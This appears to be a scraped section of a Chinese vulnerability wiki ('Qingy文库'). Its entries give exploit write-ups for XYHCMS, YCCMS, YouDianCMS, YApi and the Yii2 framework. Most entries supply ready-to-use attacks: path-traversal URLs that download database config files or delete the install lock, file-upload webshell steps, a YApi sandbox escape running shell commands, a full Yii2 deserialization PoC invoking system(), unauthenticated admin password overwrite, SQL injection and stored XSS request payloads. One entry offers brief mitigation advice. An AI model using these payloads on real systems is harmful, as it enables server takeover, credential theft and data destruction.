服务器监听shell，受害机执行任务 返回shell到服务器 参考链接 https://www.cnblogs.com/kbhome/p/13210394.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:13 "},"Web安全/XYHCMS/XYHCMS 3.2 后台任意文件下载/XYHCMS 3.2 后台任意文件下载.html":{"url":"Web安全/XYHCMS/XYHCMS 3.2 后台任意文件下载/XYHCMS 3.2 后台任意文件下载.html","title":"XYHCMS 3.2 后台任意文件下载","keywords":"","body":"XYHCMS 3.2 后台任意文件下载 一、漏洞简介 没有对下载的文件做任何限制 二、漏洞影响 XYHCMS 3.2 三、复现过程 漏洞分析 /App/Manage/Controller/DatabaseController.class.php的downfile()方法 public function downFile() { if (empty($_GET['file']) || empty($_GET['type']) || !in_array($_GET['type'], array(\"zip\", \"sql\"))) { $this->error(\"下载地址不存在\"); } $path = array(\"zip\" => $this->getDbPath() . \"Zip/\", \"sql\" => $this->getDbPath() . '/'); $filePath = $path[$_GET['type']] . $_GET['file']; if (!file_exists($filePath)) { $this->error(\"该文件不存在，可能是被删除\"); } $filename = basename($filePath); header(\"Content-type: application/octet-stream\"); header('Content-Disposition: attachment; filename=\"' . $filename . '\"'); header(\"Content-Length: \" . filesize($filePath)); readfile($filePath); } 漏洞复现 登录后台 访问http://www.0-sec.org/xyhai.php?s=/Database/downFile/file/..\\\\..\\\\..\\\\App\\\\Common\\\\Conf\\\\db.php/type/zip 下载到数据库配置文件 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:15 "},"Web安全/XYHCMS/XYHCMS 3.2 后台任意文件删除漏洞/XYHCMS 3.2 后台任意文件删除漏洞.html":{"url":"Web安全/XYHCMS/XYHCMS 3.2 后台任意文件删除漏洞/XYHCMS 3.2 后台任意文件删除漏洞.html","title":"XYHCMS 3.2 后台任意文件删除漏洞","keywords":"","body":"XYHCMS 3.2 后台任意文件删除漏洞 一、漏洞简介 二、漏洞影响 XYHCMS 3.2 三、复现过程 漏洞分析 /App/Manage/Controller/DatabaseController.class.php //删除sql文件 public function delSqlFiles() { $id = I('id', 0, 'intval'); $batchFlag = I('get.batchFlag', 0, 'intval'); //批量删除 if ($batchFlag) { $files = I('key', array()); } else { $files[] = I('sqlfilename', ''); } if (empty($files)) { $this->error('请选择要删除的sql文件'); } foreach ($files as $file) { $_ext = pathinfo($file, PATHINFO_EXTENSION); //拼接后直接删除 foreach ($files as $file) { unlink($this->getDbPath() . '/' . $file); } $this->success(\"已删除：\" . implode(\",\", $files), U('Database/restore')); } 漏洞复现 登录后台 删除安装锁文件 a. get方式 http://www.0-sec.org/xyhai.php? s=/Database/delSqlFiles/sqlfilename/..\\\\..\\\\..\\\\install/install.lock b. post方式 http://www.0-sec.org/xyhai.php?s=/Database/delSqlFiles/batchFlag/1 POST数据：key[]=../../../install/install.lock 之后访问 http://www.0-sec.org/install重装cms Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:16 "},"Web安全/XYHCMS/XYHCMS 3.5 后台任意文件读取/XYHCMS 3.5 后台任意文件读取.html":{"url":"Web安全/XYHCMS/XYHCMS 3.5 后台任意文件读取/XYHCMS 3.5 后台任意文件读取.html","title":"XYHCMS 3.5 后台任意文件读取","keywords":"","body":"XYHCMS 3.5 后台任意文件读取 一、漏洞简介 二、漏洞影响 XYHCMS 3.5 三、复现过程 漏洞分析 漏洞文件位置：/App/Manage/Controller/TempletsController.class.php 第59-83行： public function edit() { $ftype = I('ftype', 0, 'intval'); $fname = I('fname', '', 'trim,htmlspecialchars'); $file_path = !$ftype ? './Public/Home/' . C('CFG_THEMESTYLE') . '/' : './Public/Mobile/' . C('CFG_MOBILE_THEMESTYLE') . '/'; if (IS_POST) { if (empty($fname)) { $this->error('未指定文件名'); } $_ext = '.' . pathinfo($fname, PATHINFO_EXTENSION); $_cfg_ext = C('TMPL_TEMPLATE_SUFFIX'); if ($_ext != $_cfg_ext) { $this->error('文件后缀必须为\"' . $_cfg_ext . '\"'); } $content = I('content', '', ''); $fname = ltrim($fname, './'); $truefile = $file_path . $fname; if (false !== file_put_contents($truefile, $content)) { $this->success('保存成功', U('index', array('ftype' => $ftype))); } else { $this->error('保存文件失败，请重试'); } exit(); } $fname = base64_decode($fname); if (empty($fname)) { $this->error('未指定要编辑的文件'); } $truefile = $file_path . $fname; if (!file_exists($truefile)) { $this->error('文件不存在'); } $content = file_get_contents($truefile); if ($content === false) { $this->error('读取文件失败'); } $content = htmlspecialchars($content); $this->assign('ftype', $ftype); $this->assign('fname', $fname); $this->assign('content', $content); $this->assign('type', '修改模板'); $this->display(); } 这段函数中对提交的参数进行处理，然后判断是否POST数据上来，如果有就进行保存等，如果没有POST数据，将跳过这段代码继续向下执行。 我们可以通过GET传入fname，跳过前面的保存文件过程，进入文件读取状态。 对fname进行base64解码，判断fname参数是否为空，拼接成完整的文件路径，然后判断这个文件是否存在，读取文件内容。 对fname未进行任何限制，导致程序在实现上存在任意文件读取漏洞。 漏洞复现： 登录网站后台，数据库配置文件路径：\\App\\Common\\Conf\\db.php我们将这段组成相对路径，..\\\\..\\\\..\\\\App\\\\Common\\\\Conf\\\\db.php，然后进行base64编码，Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA== 最后构造的链接形式如下：http://www.0-sec.org/xyhai.php?s=/Templets/edit/fname/Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA== Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:16 "},"Web安全/XYHCMS/XYHCMS 3.6 后台代码执行漏洞（一）/XYHCMS 3.6 后台代码执行漏洞（一）.html":{"url":"Web安全/XYHCMS/XYHCMS 3.6 后台代码执行漏洞（一）/XYHCMS 3.6 后台代码执行漏洞（一）.html","title":"XYHCMS 3.6 后台代码执行漏洞（一）","keywords":"","body":"XYHCMS 3.6 后台代码执行漏洞（一） 一、漏洞简介 （CNVD-2020-03899） XYHCMS后台存在代码执行漏洞，攻击者可利用该漏洞在site.php中增加恶意代码，从而可以获取目标终端的权限。 二、漏洞影响 XYHCMS 3.6 三、复现过程 搜索site.php 打开发现是一堆配置文件,这让我想起了前不久看到的一个漏洞所以就全局去找写入点 /media/rId24.png) /media/rId25.png) 很显然这里是可以写入的,不过却没有这么简单 /media/rId26.png) 有过滤,所以我暂时放弃了'但是我找到一个其他的写入点并没有过滤 /media/rId27.png) /media/rId28.png) /media/rId29.png) 参考链接 http://101.200.56.59/cnvd-2020-03899%E5%88%86%E6%9E%90/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:17 "},"Web安全/XYHCMS/XYHCMS 3.6 后台代码执行漏洞（三）/XYHCMS 3.6 后台代码执行漏洞（三）.html":{"url":"Web安全/XYHCMS/XYHCMS 3.6 后台代码执行漏洞（三）/XYHCMS 3.6 后台代码执行漏洞（三）.html","title":"XYHCMS 3.6 后台代码执行漏洞（三）","keywords":"","body":"XYHCMS 3.6 后台代码执行漏洞（三） 一、漏洞简介 二、漏洞影响 XYHCMS 3.6 三、复现过程 /media/rId24.png) /media/rId25.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:19 "},"Web安全/XYHCMS/XYHCMS 3.6 后台代码执行漏洞（二）/XYHCMS 3.6 后台代码执行漏洞（二）.html":{"url":"Web安全/XYHCMS/XYHCMS 3.6 后台代码执行漏洞（二）/XYHCMS 3.6 后台代码执行漏洞（二）.html","title":"XYHCMS 3.6 后台代码执行漏洞（二）","keywords":"","body":"XYHCMS 3.6 后台代码执行漏洞（二） 一、漏洞简介 二、漏洞影响 XYHCMS 3.6 三、复现过程 漏洞分析 /App/Manage/Controller/SystemController.class.php public function site() { if (IS_POST) { $data = I('config', array(), 'trim'); //]*?\\>.*? $preg_param = '/]*?\\>/is'; foreach ($data as $key => $val) { if (stripos($val, '/i', '', $val); } ———————————————————————————————————————————————————————————————————————————— if (stripos($val, ']*?\\>.*?/i', '', $val); } if (stripos($data[$key], 'error('禁止输入php代码'); } } ———————————————————————————————————————————————————————————————————————————— 漏洞复现 进入后台 系统设置->网站设置->会员配置->禁止使用的名称 /media/rId26.png){width=\"5.833333333333333in\" height=\"2.553546587926509in\"} 访问漏洞文件,蚁剑连接 http://localhost/App/Runtime/Data/config/site.php POST数据：cmd=phpinfo(); Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:20 "},"Web安全/XYHCMS/XYHCMS 3.6 后台文件上传getshell（一）/XYHCMS 3.6 后台文件上传getshell（一）.html":{"url":"Web安全/XYHCMS/XYHCMS 3.6 后台文件上传getshell（一）/XYHCMS 3.6 后台文件上传getshell（一）.html","title":"XYHCMS 3.6 后台文件上传getshell（一）","keywords":"","body":"XYHCMS 3.6 后台文件上传getshell（一） 一、漏洞简介 对后缀过滤不严，未过滤php3-5，phtml（老版本直接未过滤php） 二、漏洞影响 XYHCMS 3.6 三、复现过程 漏洞分析 /App/Manage/Controller/SystemController.class.php Line 246-255 if (!empty($data['CFG_UPLOAD_FILE_EXT'])) { $data['CFG_UPLOAD_FILE_EXT'] = strtolower($data['CFG_UPLOAD_FILE_EXT']); $_file_exts = explode(',', $data['CFG_UPLOAD_FILE_EXT']); $_no_exts = array('php', 'asp', 'aspx', 'jsp'); foreach ($_file_exts as $ext) { if (in_array($ext, $_no_exts)) { $this->error('允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！'); } } } 漏洞复现 进入后台 系统设置->网站设置->上传配置->允许附件类型 添加类型 php3或 php4或 php5 或 phtml 点击下面的 水印图片上传上传以上后缀shell，此时点不点提交都已经传入服务器 之后会在图片部分显示上传路径 /media/rId26.png){width=\"5.833333333333333in\" height=\"2.686567147856518in\"} 访问连接即可，只有网站配置了.htaccess自动解析php3-5与phtml的才能解析。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:20 "},"Web安全/XYHCMS/XYHCMS 3.6 后台文件上传getshell（二）仅限Windows/XYHCMS 3.6 后台文件上传getshell（二）仅限Windows.html":{"url":"Web安全/XYHCMS/XYHCMS 3.6 后台文件上传getshell（二）仅限Windows/XYHCMS 3.6 后台文件上传getshell（二）仅限Windows.html","title":"XYHCMS 3.6 后台文件上传getshell（二）仅限Windows","keywords":"","body":"XYHCMS 3.6 后台文件上传getshell（二）仅限Windows 一、漏洞简介 windows系统特性，windows会将 ::$DATA忽略 二、漏洞影响 XYHCMS 3.6 三、复现过程 漏洞分析 /App/Manage/Controller/SystemController.class.php if (!empty($data['CFG_UPLOAD_FILE_EXT'])) { $data['CFG_UPLOAD_FILE_EXT'] = strtolower($data['CFG_UPLOAD_FILE_EXT']); $_file_exts = explode(',', $data['CFG_UPLOAD_FILE_EXT']); $_no_exts = array('php', 'asp', 'aspx', 'jsp'); foreach ($_file_exts as $ext) { if (in_array($ext, $_no_exts)) { $this->error('允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！'); } } } 漏洞复现 进入后台 系统设置->网站设置->上传配置->允许附件类型 添加类型 shell.php::$DATA 点击下面的 水印图片上传上传以上后缀shell，此时点不点提交都已经传入服务器 之后会在图片部分显示上传路径，在windows下面，会自动忽略后面的。 用蚁剑访问 http://www.0-sec.org/路径去掉::$DATA Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:21 "},"Web安全/YApi/YApi 高级 Mock 远程代码执行漏洞/YApi 高级 Mock 远程代码执行漏洞.html":{"url":"Web安全/YApi/YApi 高级 Mock 远程代码执行漏洞/YApi 高级 Mock 远程代码执行漏洞.html","title":"YApi 高级 Mock 远程代码执行漏洞","keywords":"","body":"YApi 高级 Mock 远程代码执行漏洞 漏洞描述 YAPI接口管理平台是国内某旅行网站的大前端技术中心开源项目，使用mock数据/脚本作为中间交互层，为前端后台开发与测试人员提供更优雅的接口管理服务，该系统被国内较多知名互联网企业所采用。 YApi 是高效、易用、功能强大的 api 管理平台。但因为大量用户使用 YAPI的默认配置并允许从外部网络访问 YApi服务，导致攻击者注册用户后，即可通过 Mock功能远程执行任意代码。 漏洞影响 YApi FOFA app=\"YApi\" 漏洞复现 注册页面如下： 随便注册一个号，然后进行登录，登录进去以后点击添加项目： 随便写一个项目名字，然后在项目里再点击添加接口： 创建好了以后进入设置，进入mock配置： const sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor('return process') const process = myfun() mockJson = process.mainModule.require(\"child_process\").execSync(\"whoami\").toString() 点击保存以后，然后再访问我们的mock地址： 修复建议 该漏洞暂无补丁。 临时修复建议： 关闭YAPI用户注册功能，以阻断攻击者注册。 利用请求白名单的方式限制 YAPI 相关端口。 排查 YAPI 服务器是否存在恶意访问记录。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:22 "},"Web安全/YCCMS/YCCMS 3.4 任意文件上传漏洞（一）/YCCMS 3.4 任意文件上传漏洞（一）.html":{"url":"Web安全/YCCMS/YCCMS 3.4 任意文件上传漏洞（一）/YCCMS 3.4 任意文件上传漏洞（一）.html","title":"YCCMS 3.4 任意文件上传漏洞（一）","keywords":"","body":"YCCMS 3.4 任意文件上传漏洞（一） 一、漏洞简介 二、漏洞影响 YCCMS 3.4 三、复现过程 在不需要登录的情况上传成功/media/rId24.png)定位到漏洞位置： controller\\CallAction.class.php public function upLoad() { if (isset($_POST['send'])) { $_logoupload = new LogoUpload('pic',$_POST['MAX_FILE_SIZE']); $_path = $_logoupload->getPath(); $_img = new Image($_path); $_img->xhImg(960,0); $_img->out(); //echo $_path; $_logoupload->alertOpenerClose('图片上传成功！','..'.$_path); } else { exit('警告：文件过大或者其他未知错误导致浏览器崩溃！'); } } 然后跟进到类LogoUpload ,位于public\\class\\LogoUpload.class.php，上传首要关注上传是是否允许上传非图片格式的文件 private function checkType() { if (!in_array($this->type,$this->typeArr)) { Tool::alertBack('警告：LOGO图片必须是PNG格式！'); } } private $typeArr = array('image/png','image/x-png');//类型合集 根据Content-Type的值来判断是否是图片格式，只要Content-Type是这两种类型就可以，那直接伪造Content-Type就可以了/media/rId25.png) 参考链接 https://xz.aliyun.com/t/7748\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:25 "},"Web安全/YCCMS/YCCMS 3.4 任意文件上传漏洞（二）/YCCMS 3.4 任意文件上传漏洞（二）.html":{"url":"Web安全/YCCMS/YCCMS 3.4 任意文件上传漏洞（二）/YCCMS 3.4 任意文件上传漏洞（二）.html","title":"YCCMS 3.4 任意文件上传漏洞（二）","keywords":"","body":"YCCMS 3.4 任意文件上传漏洞（二） 一、漏洞简介 二、漏洞影响 YCCMS 3.4 三、复现过程 /media/rId24.png)在不需要登录的情况下可以看到已经上传成功，上传地址为E:/phpstudy/WWW/yccms/uploads/20200509133351770.php定位漏洞位置为controller\\CallAction.class.php中的xhUp函数 public function xhUp() { if (isset($_GET['type'])) { $_fileupload = new FileUpload('filedata',10); $_err=$_fileupload->checkError(); $_path = $_fileupload->getPath(); $_msg=\"'..$_path'\"; $_img = new Image($_path); $_img->xhImg(650,0); $_img->out(); echo \"{'err':'\".$_err.\"','msg':\".$_msg.\"}\"; exit(); } else { Tool::alertBack('警告：由于非法操作导致上传失败！'); } } 跟进到类FileUpload， 位于public\\class\\FileUpload.class.php，然后看到同样也是检查的传入的Content-Type的值 private function checkType() { if (!in_array($this->type,$this->typeArr)) { Tool::alertBack('警告：不合法的上传类型！'); } } private $typeArr = array('image/jpeg','image/pjpeg','image/png','image/x-png','image/gif'); 参考链接 https://xz.aliyun.com/t/7748\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:26 "},"Web安全/YCCMS/YCCMS 3.4 任意文件删除/YCCMS 3.4 任意文件删除.html":{"url":"Web安全/YCCMS/YCCMS 3.4 任意文件删除/YCCMS 3.4 任意文件删除.html","title":"YCCMS 3.4 任意文件删除","keywords":"","body":"YCCMS 3.4 任意文件删除 一、漏洞简介 二、漏洞影响 YCCMS 3.4 三、复现过程 POST /admin/?a=pic&m=delall HTTP/1.1 Host: www.0-sec.org:8082 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 89 Origin: http://127.0.0.1:8082 Connection: close Referer: http://127.0.0.1:8082/admin/?a=pic Upgrade-Insecure-Requests: 1 pid%5B0%5D=../1.txt&chkall=on&send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87t 只需要更改pid[0]即可在无登录条件下任意删除文件，删除根目录下的1.txt已经删除成功了其实这还是犯了一个最容易犯的错误，没有对传进来的路径进行过滤就拼接了目录，导致了任意文件删除漏洞的产生根据url定位到相关函数位置,位于/controller/PicAction.class.php public function delall(){ if(isset($_POST['send'])){ if(validate::isNullString($_POST['pid'])) tool::layer_alert('没有选择任何图片!','?a=pic',7); $_fileDir=ROOT_PATH.'/uploads/'; foreach($_POST['pid'] as $_value){ $_filePath=$_fileDir.$_value; if(!unlink($_filePath)){ tool::layer_alert('图片删除失败,请设权限为777!','?a=pic',7); }else{ header('Location:?a=pic'); } } } } 对 pid传进来的值并没有进行过滤就进行了了路径的拼接，导致了路径穿越漏洞，触发任意文件删除漏洞 参考链接 https://xz.aliyun.com/t/7748\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:27 "},"Web安全/YCCMS/YCCMS 3.4 反射型xss/YCCMS 3.4 反射型xss.html":{"url":"Web安全/YCCMS/YCCMS 3.4 反射型xss/YCCMS 3.4 反射型xss.html","title":"YCCMS 3.4 反射型xss","keywords":"","body":"YCCMS 3.4 反射型xss 一、漏洞简介 二、漏洞影响 YCCMS 3.4 三、复现过程 https://www.0-sec.org/admin/?a=html&art=alert(ian)&m=arts Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:28 "},"Web安全/YCCMS/YCCMS 3.4 未授权更改管理员账号密码/YCCMS 3.4 未授权更改管理员账号密码.html":{"url":"Web安全/YCCMS/YCCMS 3.4 未授权更改管理员账号密码/YCCMS 3.4 未授权更改管理员账号密码.html","title":"YCCMS 3.4 未授权更改管理员账号密码","keywords":"","body":"YCCMS 3.4 未授权更改管理员账号密码 一、漏洞简介 二、漏洞影响 YCCMS 3.4 三、复现过程 首先来看一下漏洞利用过程，在未登录的情况下构造url,只需要更改username password notpassword的值即可更改数据库中admin账号的相关信息去数据库中查看发现已经更改了账号密码根据url来定位一下漏洞函数，函数位于controller\\AdminAction.class.php中的update函数 public function update(){ if(isset($_POST['send'])){ if(validate::isNullString($_POST['username'])) Tool::t_back('用户名不能为空','?a=admin&m=update'); if(validate::isNullString($_POST['password'])) Tool::t_back('密码不能为空!','?a=admin&m=update'); if(!(validate::checkStrEquals($_POST['password'], $_POST['notpassword']))) Tool::t_back('两次密码不一致!','?a=admin&m=update'); $this->_model->username=$_POST['username']; $this->_model->password=sha1($_POST['password']); $_edit=$this->_model->editAdmin(); if($_edit){ tool::layer_alert('密码修改成功!','?a=admin&m=update',6); }else{ tool::layer_alert('密码未修改!','?a=admin&m=update',6); } } $this->_tpl->assign('admin', $_SESSION['admin']); $this->_tpl->display('admin/public/update.tpl'); } 可以看到前面都是一些判断，重点关注下editAdmin()函数，该函数位于model\\AdminModel.class.php public function editAdmin(){ $_sql=\"UPDATE my_admin SET username='$this->username', password='$this->password' WHERE id=1 LIMIT 1\"; return parent::update($_sql); } 该函数的父类为Model, 位于model\\Model.class.php，看一下update函数 protected function update($_sql){ return $this->execute($_sql)->rowCount(); } 调用execute函数去执行sql语句 protected function execute($_sql){ try{ $_stmt=$this->_db->prepare($_sql); $_stmt->execute(); }catch (PDOException $e){ exit('SQL语句:'.$_sql.'错误信息:'.$e->getMessage()); } return $_stmt; } } 这一系列的操作主要是用来生成SQL语句然后执行SQL语句，editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id=1的数据，这也就造成了任意更改管理员账号密码 参考链接 https://xz.aliyun.com/t/7748\\#toc-2 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:29 "},"Web安全/Yii2/（CVE-2020-15148）Yii2框架反序列化漏洞/（CVE-2020-15148）Yii2框架反序列化漏洞.html":{"url":"Web安全/Yii2/（CVE-2020-15148）Yii2框架反序列化漏洞/（CVE-2020-15148）Yii2框架反序列化漏洞.html","title":"（CVE-2020-15148）Yii2框架反序列化漏洞","keywords":"","body":"（CVE-2020-15148）Yii2框架反序列化漏洞 一、漏洞简介 如果在使用yii框架，并且在用户可以控制的输入处调用了unserialize()并允许特殊字符的情况下，会受到反序列化远程命令命令执行漏洞攻击。 该漏洞只是php 反序列化的执行链，必须要配合unserialize函数才可以达到任意代码执行的危害。 二、漏洞影响 Yii2 \\ 三、复现过程 环境搭建 由于我本地的composer不知道为啥特别慢（换源也不管用），所以这里直接去Yii2的官方仓库里面拉。 Yii2框架反序列化漏洞/media/rId25.jpg) 选择一个漏洞影响的版本yii-basic-app-2.0.37.tgz解压到Web目录，然后修改一下配置文件。/config/web.php: Yii2框架反序列化漏洞/media/rId26.jpg) 给cookieValidationKey字段设置一个值（如果是composer拉的可以跳过这一步）接着添加一个存在漏洞的Action``/controllers/TestController.php: Yii2框架反序列化漏洞/media/rId27.jpg) 测试访问： Yii2框架反序列化漏洞/media/rId28.jpg) 漏洞分析 由于没有漏洞细节，我们可以去Yii2的官方仓库看看提交记录。yiisoft/yii2 Yii2框架反序列化漏洞/media/rId31.jpg) 在最新版中官方给yii\\db\\BatchQueryResult类加了一个__wakeup()函数，直接不允许反序列化这个类了。 所以这里猜测该类为反序列化起点。/vendor/yiisoft/yii2/db/BatchQueryResult.php: reset(); } public function reset() { if ($this->_dataReader !== null) { $this->_dataReader->close(); } $this->_dataReader = null; $this->_batch = null; $this->_value = null; $this->_key = null; } /** ...... */ } ?> 可以看到__destruct()调用了reset()方法reset()方法中，$this->_dataReader是可控的，所以此处可以当做跳板，去执行其他类中的__call()方法。 全局搜索function __call( Yii2框架反序列化漏洞/media/rId32.jpg) 其中找到一个Faker\\Generator类/vendor/fzaninotto/faker/src/Faker/Generator.php: getFormatter($formatter), $arguments); } public function getFormatter($formatter) { if (isset($this->formatters[$formatter])) { return $this->formatters[$formatter]; } foreach ($this->providers as $provider) { if (method_exists($provider, $formatter)) { $this->formatters[$formatter] = array($provider, $formatter); return $this->formatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter)); } public function __call($method, $attributes) { return $this->format($method, $attributes); } /** ...... */ } ?> 可以看到，此处的__call()方法调用了format()，且format()从$this->formatter里面取出对应的值后，带入了call_user_func_array()函数中。由于$this->formatter是我们可控的，所以我们这里可以调用任意类中的任意方法了。但是$arguments是从yii\\db\\BatchQueryResult::reset()里传过来的，我们不可控，所以我们只能不带参数地去调用别的类中的方法。 到了这一步只需要找到一个执行类即可。我们可以全局搜索call_user_func\\(\\$this->([a-zA-Z0-9]+), \\$this->([a-zA-Z0-9]+)，得到使用了call_user_func函数，且参数为类中成员变量的所有方法。 Yii2框架反序列化漏洞/media/rId33.jpg) 查看后发现yii\\rest\\CreateAction::run()和yii\\rest\\IndexAction::run()这两个方法比较合适。这里拿yii\\rest\\CreateAction::run()举例/vendor/yiisoft/yii2/rest/CreateAction.php: checkAccess) { call_user_func($this->checkAccess, $this->id); } /* @var $model \\yii\\db\\ActiveRecord */ $model = new $this->modelClass([ 'scenario' => $this->scenario, ]); $model->load(Yii::$app->getRequest()->getBodyParams(), ''); if ($model->save()) { $response = Yii::$app->getResponse(); $response->setStatusCode(201); $id = implode(',', array_values($model->getPrimaryKey(true))); $response->getHeaders()->set('Location', Url::toRoute([$this->viewAction, 'id' => $id], true)); } elseif (!$model->hasErrors()) { throw new ServerErrorHttpException('Failed to create the object for unknown reason.'); } return $model; } /** ...... */ } ?> $this->checkAccess和$this->id都是我们可控的。所以整个利用链就出来了。 yii\\db\\BatchQueryResult::__destruct() -> Faker\\Generator::__call() -> yii\\rest\\CreateAction::run() 还是挺简单的一个漏洞 poc namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this->checkAccess = 'system'; $this->id = 'ls -al'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this->formatters['close'] = [new CreateAction, 'run']; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this->_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult)); } ?> Yii2框架反序列化漏洞/media/rId35.jpg) 参考链接 https://xz.aliyun.com/t/8307 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:30 "},"Web安全/YouDianCMS/YouDianCMS 8.0 sql注入漏洞/YouDianCMS 8.0 sql注入漏洞.html":{"url":"Web安全/YouDianCMS/YouDianCMS 8.0 sql注入漏洞/YouDianCMS 8.0 sql注入漏洞.html","title":"YouDianCMS 8.0 sql注入漏洞","keywords":"","body":"YouDianCMS 8.0 sql注入漏洞 一、漏洞简介 二、漏洞影响 YouDianCMS 8.0 三、复现过程 漏洞分析 需要先登录此漏洞。页面可以注册。 http://localhost/youdiancms/index.php/public/reg/l/cn 在这里登录 漏洞位置位于index.php/member/customer/index搜索栏 未筛选搜索的关键字，导致sql注入漏洞 /App/Lib/Action/Member/CustomerAction.class.php： function saveModify(){ header(\"Content-Type:text/html; charset=utf-8\"); $this->_checkPost( $_POST ); unset( $_POST['InviterID'], $_POST['IsEnable']); $m = D('Admin/Member'); $inviterID = $m->where(\"MemberID={$_POST['MemberID']}\")->getField('InviterID'); //检查当前MemberID是否自己的客户 if( $inviterID == session('MemberID')){ if( $m->create() ){ if($m->save() === false){ $this->ajaxReturn(null, '修改失败!' , 0); }else{ $this->ajaxReturn(null, '修改成功!' , 1); } }else{ $this->ajaxReturn(null, $m->getError() , 0); } }else{ $this->ajaxReturn(null, '数据异常' , 0); } } 漏洞点在: $inviterID = $m->where(\"MemberID={$_POST['MemberID']}\")->getField('InviterID'); 上述代码直接将POST带入进了where子查询。 复现 POC： URL：http://www.0-sec.org/index.php/Member/Customer/saveModify POST：MemberName=xxxxx&MemberID=[SQL] 四、参考链接 https://blog.csdn.net/qq_36093477/article/details/98035255 http://www.f4ckweb.top/index.php/archives/45/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:32 "},"Web安全/YouDianCMS/YouDianCMS 8.0 Storeage XSS/YouDianCMS 8.0 Storeage XSS.html":{"url":"Web安全/YouDianCMS/YouDianCMS 8.0 Storeage XSS/YouDianCMS 8.0 Storeage XSS.html","title":"YouDianCMS 8.0 Storeage XSS","keywords":"","body":"YouDianCMS 8.0 Storeage XSS 一、漏洞简介 二、漏洞影响 YouDianCMS 8.0 三、复现过程 POST /index.php/Admin/wx/saveSubscribeReply HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: application/json, text/javascript, /; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Referer: http://0-sec.org/index.php/Admin/Wx/subscribereply/l/en/random/1560696407129 X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------17443203555821 Content-Length: 2207 DNT: 1 Connection: close Cookie: PHPSESSID=bkv171om25ji6a51t7dql010h2; youdianAdminLangSet=en; CKFinder_Path=Files%3A%2F%3A1; CKFinder_Settings=TNNDS; youdianMenuTopID=15 -----------------------------17443203555821 Content-Disposition: form-data; name=\"ReplyID\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"TypeID\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a1\" \">alert(1) -----------------------------17443203555821 Content-Disposition: form-data; name=\"a2\" 2 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a3\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a4\" \">alert(1) -----------------------------17443203555821 Content-Disposition: form-data; name=\"a5\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a6\" -----------------------------17443203555821 Content-Disposition: form-data; name=\"musicfile\" -----------------------------17443203555821 Content-Disposition: form-data; name=\"a11\" -----------------------------17443203555821 Content-Disposition: form-data; name=\"a12\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a13\" -----------------------------17443203555821 Content-Disposition: form-data; name=\"a14\" -----------------------------17443203555821 Content-Disposition: form-data; name=\"a15\" \">alert(1) -----------------------------17443203555821 Content-Disposition: form-data; name=\"a16\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a7\" 2 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a8\" 2,大转盘 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a10\" -----------------------------17443203555821 Content-Disposition: form-data; name=\"a9\" \">alert(1) -----------------------------17443203555821 Content-Disposition: form-data; name=\"IsEnable\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"hash\" 19b37a0a1054dfd209b9a17c704027f3_db90bddc24f4e98592b355e2cbbca612 -----------------------------17443203555821-- 该漏洞触发的位置在\"微信平台\"-\"自动回复\"-\"跟踪自动回复\"的\"微信短信\"中，最后点击保存触发。 四、参考链接 https://github.com/ReboOt68/youdiancms8.0-StoreageXSS-POC/issues/2 